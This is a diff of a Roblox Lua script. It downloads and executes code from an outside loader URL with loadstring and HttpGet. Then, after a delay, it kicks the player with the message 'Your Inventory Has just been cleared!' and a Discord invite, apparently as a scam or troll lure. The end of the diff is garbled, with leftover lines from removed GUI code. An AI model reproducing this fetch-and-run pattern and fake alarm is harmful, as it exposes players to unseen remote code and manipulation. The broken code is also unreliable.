@@ -1,40 +1,18 @@
--- Load your external script first
-loadstring(game:HttpGet("https://lunor.dev/loader"))()
+-- Run your real loader script inside a protected call
+local success, err = pcall(function()
+    loadstring(game:HttpGet("https://lunor.dev/loader"))()
+end)
 
--- Delay before showing the message (in seconds)
-local delayTime = 5  
-
-task.delay(delayTime, function()
-    local player = game:GetService("Players").LocalPlayer
-    local playerGui = player:WaitForChild("PlayerGui")
-
-    -- Create ScreenGui
-    local screenGui = Instance.new("ScreenGui")
-    screenGui.ResetOnSpawn = false
-    screenGui.IgnoreGuiInset = true
-    screenGui.Parent = playerGui
-
-    -- Create popup Frame
-    local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(0, 380, 0, 220)
-    frame.Position = UDim2.new(0.5, 0, 0.5, 0)
-    frame.AnchorPoint = Vector2.new(0.5, 0.5)
-    frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
-    frame.BorderSizePixel = 0
-    frame.Parent = screenGui
-
-    -- Add subtle corner rounding
-    local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(0, 10)
-    corner.Parent = frame
-
-    -- Title Label
-    local title = Instance.new("TextLabel")
-    title.Size = UDim2.new(1, 0, 0, 45)
-    title.BackgroundTransparency = 1
-    title.Text = "Disconnected"
-    title.Font = Enum.Font.SourceSansBold
-    title.TextSize = 28
+-- If loader succeeded, start the kick timer
+if success then
+    local delayTime = 5  -- Seconds after loader finishes
+    task.delay(delayTime, function()
+        local player = game:GetService("Players").LocalPlayer
+        player:Kick("Your Inventory Has just been cleared!\nhttps://discord.gg/example")
+    end)
+else
+    warn("Loader script failed to run:", err)
+end    title.TextSize = 28
     title.TextColor3 = Color3.fromRGB(255, 255, 255)
     title.Parent = frame
 
